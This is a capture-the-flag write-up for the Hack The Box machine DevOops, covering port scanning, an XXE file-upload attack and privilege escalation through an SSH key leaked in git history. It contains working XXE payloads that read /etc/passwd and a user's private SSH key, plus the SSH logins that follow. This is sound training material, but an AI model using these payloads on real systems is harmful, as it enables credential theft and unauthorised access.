# HTB - DevOops

#### Ip: 10.10.10.91
#### Name: DevOops
#### Rating: Medium

----------------------------------------------------------------------

DevOops.png

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also user the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/HTB/DevOops]
└─$ sudo nmap -p-  --min-rate 10000 10.10.10.91  
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-08 10:19 CDT
Nmap scan report for 10.10.10.91
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
```

Lets dive a bit deeper and scan these open ports using the `-sV` and `-sC` flags to enumerate versions and to use default Nmap scripts:

```text
┌──(ryan㉿kali)-[~/HTB/DevOops]
└─$ sudo nmap -sC -sV -T4 10.10.10.91 -p 22,5000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-08 10:19 CDT
Nmap scan report for 10.10.10.91
Host is up (0.067s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4290e335318d8b86172afb3890dac495 (RSA)
|   256 b7b6dcc44c879b752a008983edb28031 (ECDSA)
|_  256 d52f1953b28e3a4bb3dd3c1fc0370d00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
```

Heading to the site on port 5000 we see a page that is under construction:

site.png

Doing some directory fuzzing we find an `/upload` directory.

upload.png

Interesting..We've got a file upload area, and there are even some notes about which XML elements are in play. 

Lest test for XXE

### Exploitation

I'll create an .xml file called test.xml with the elements mentioned on the site:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<hey>
    <Author>bob</Author>
    <Subject>bob</Subject>
    <Content>&xxe;</Content>
</hey>
```

And upload this file:

passwd.png

Nice! That worked! We also see that there is a user named roosa on the box. Lets see if they happen to have an id_rsa file in their home directory. We can create a new .xml file with the following:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa"> ]>
<hey>
    <Author>bob</Author>
    <Subject>bob</Subject>
    <Content>&xxe;</Content>
</hey>
```

After uploading this we succesfully dropped roosa's SSH key:

id.png

Lets add that to a file called id_rsa, and then update permissions on it:

```text
┌──(ryan㉿kali)-[~/HTB/DevOops]
└─$ chmod 600 id_rsa
```

We can then use the key to SSH in as user roosa:

```text
┌──(ryan㉿kali)-[~/HTB/DevOops]
└─$ ssh -i id_rsa roosa@10.10.10.91 

<SNIP>

roosa@devoops:~$ whoami
roosa
roosa@devoops:~$ id
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
roosa@devoops:~$ hostname
devoops
```

We can now grab the user.txt flag:

user_flag.png

### Privilege Escalation

Finding a `.git` folder I realize roosa and team are utilizing git. Lets see if we can find any commits:

git.png

Cool, we can see several different commits. 

Scrolling through them, this one seems especially interesting to me:

com.png

Lets check it out:

show.png

Nice, we can see that the key in red was replaced by the key in green. 

change.png

Lets see who else on the box has bash enabled, and who the key may belong to:

bash.png

Just a few choices here. 

Lets copy the key back to our attacking machine and try to SSH in as root:

```text
┌──(ryan㉿kali)-[~/HTB/DevOops]
└─$ chmod 600 new_key       
                                                                                                                     
┌──(ryan㉿kali)-[~/HTB/DevOops]
└─$ ssh -i new_key root@10.10.10.91 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Fri Sep 23 09:46:30 2022
root@devoops:~# whoami
root
root@devoops:~# hostname
devoops
```

Nice! That key worked for root!

Lets grab our root.txt flag:

root_flag.png

Thanks for following along!

-Ryan

----------------------------------------------------------